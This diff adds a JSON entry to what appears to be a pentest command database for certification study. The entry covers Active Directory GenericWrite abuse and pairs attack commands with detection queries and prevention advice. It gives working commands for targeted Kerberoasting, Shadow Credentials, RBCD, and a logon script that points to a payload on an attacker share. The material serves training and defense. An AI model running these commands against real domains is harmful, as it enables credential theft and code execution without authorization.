@@ -1,0 +1,102 @@
+{
+  "id": "ad-genericwrite-abuse",
+  "name": "GenericWrite Abuse - Targeted Kerberoast/Shadow Creds/Logon Script",
+  "command": "Set-DomainObject -Identity <target_account> -Set @{serviceprincipalname=\"fake/spn\"} -Verbose",
+  "description": "GenericWrite permission allows modifying non-protected attributes on an AD object. For user objects, this enables targeted Kerberoasting (set SPN), logon script injection (scriptPath), or Shadow Credentials (msDS-KeyCredentialLink). For computer objects, it enables RBCD setup. GenericWrite is one of the most common and dangerous ACL misconfigurations in AD.",
+  "platform": "windows",
+  "type": "attack-chain",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "ACL Abuse",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "CRTP ACL abuse module; BloodHound edge documentation",
+  "tags": [
+    "genericwrite",
+    "acl-abuse",
+    "targeted-kerberoast",
+    "shadow-credentials",
+    "logon-script",
+    "spn-jacking"
+  ],
+  "mitre": [
+    "T1558.003",
+    "T1222.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== ABUSE PATH 1: TARGETED KERBEROAST ===\n  # Set a fake SPN on the target user\n  Set-DomainObject -Identity <target_account> -Set @{serviceprincipalname=\"fake/spn\"} -Verbose\n  # Kerberoast the user\n  Rubeus.exe kerberoast /user:<target_account> /nowrap\n  # Clean up\n  Set-DomainObject -Identity <target_account> -Clear serviceprincipalname -Verbose\n\n=== ABUSE PATH 2: SHADOW CREDENTIALS ===\n  # Add key credential link\n  Whisker.exe add /target:<target_account>\n  # Or with pywhisker from Linux:\n  python3 pywhisker.py -d <domain> -u <user> -p <pass> --target <target_account> --action add\n  # Authenticate with the generated certificate\n  Rubeus.exe asktgt /user:<target_account> /certificate:<base64_cert> /password:<cert_pass> /ptt\n\n=== ABUSE PATH 3: LOGON SCRIPT ===\n  Set-DomainObject -Identity <target_account> -Set @{scriptpath=\"\\\\<attacker>\\share\\payload.ps1\"}\n  # Executes next time the user logs in\n\n=== ABUSE PATH 4: RBCD (on computer objects) ===\n  Set-ADComputer <target_computer> -PrincipalsAllowedToDelegateToAccount <attacker_computer>$",
+  "examples": [
+    {
+      "label": "Set SPN for targeted Kerberoast",
+      "command": "Set-DomainObject -Identity svc_admin -Set @{serviceprincipalname=\"fake/spn\"} -Verbose"
+    },
+    {
+      "label": "Shadow Credentials with Whisker",
+      "command": "Whisker.exe add /target:svc_admin"
+    },
+    {
+      "label": "Logon script injection",
+      "command": "Set-DomainObject -Identity svc_admin -Set @{scriptpath=\"\\\\attacker\\share\\payload.ps1\"}"
+    }
+  ],
+  "references": [
+    {
+      "title": "BloodHound - GenericWrite Edge",
+      "url": "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html"
+    },
+    {
+      "title": "MITRE T1222.001 - File and Directory Permissions Modification",
+      "url": "https://attack.mitre.org/techniques/T1222/001/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-targeted-kerberoast",
+      "note": "Full targeted Kerberoasting workflow after setting the SPN.",
+      "rel": "next"
+    },
+    {
+      "id": "ad-acl-decision-tree",
+      "note": "Decision tree for choosing the right ACL abuse path.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "GenericWrite allows setting most non-protected attributes. ServicePrincipalName, scriptPath, and msDS-KeyCredentialLink are all writable, enabling multiple attack paths from a single permission.",
+    "prerequisites": "GenericWrite permission on a target user or computer object.",
+    "impact": "Credential theft via Kerberoasting; remote code execution via logon script; impersonation via Shadow Credentials.",
+    "detection": "[MITRE T1558.003] SPN modification on user accounts (Event 5136); scriptPath changes; msDS-KeyCredentialLink modifications.",
+    "artifacts": "Event 5136 (directory service change) for SPN/scriptPath/KeyCredentialLink; Event 4769 for subsequent Kerberoast.",
+    "splunk_spl": "index=windows EventCode=5136 (AttributeLDAPDisplayName=\"servicePrincipalName\" OR AttributeLDAPDisplayName=\"scriptPath\" OR AttributeLDAPDisplayName=\"msDS-KeyCredentialLink\")\n| table _time, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+    "elastic_kql": "event.code:\"5136\" AND winlog.event_data.AttributeLDAPDisplayName:(\"servicePrincipalName\" OR \"scriptPath\" OR \"msDS-KeyCredentialLink\")",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName in (\"servicePrincipalName\", \"scriptPath\", \"msDS-KeyCredentialLink\")\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+    "sigma_rules": "win_security_genericwrite_abuse_spn_script",
+    "prevention": "Audit and remove unnecessary GenericWrite permissions; monitor attribute changes on privileged accounts; use Protected Users group.",
+    "sources": [
+      "CRTP ACL module",
+      "https://attack.mitre.org/techniques/T1558/003/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "GenericWrite abuse - SPN or scriptPath modification",
+        "logic": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName in (\"servicePrincipalName\", \"scriptPath\", \"msDS-KeyCredentialLink\")\n| where SubjectUserName !in (\"SYSTEM\", \"Exchange\")\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+        "data_source": "windows-security",
+        "log_ids": [
+          "5136"
+        ],
+        "attack": [
+          "T1558.003",
+          "T1222.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate SPN management; script deployment via GPO",
+        "tuning": "Whitelist known admin accounts and automation; alert on user-object SPN changes"
+      }
+    ]
+  }
+}
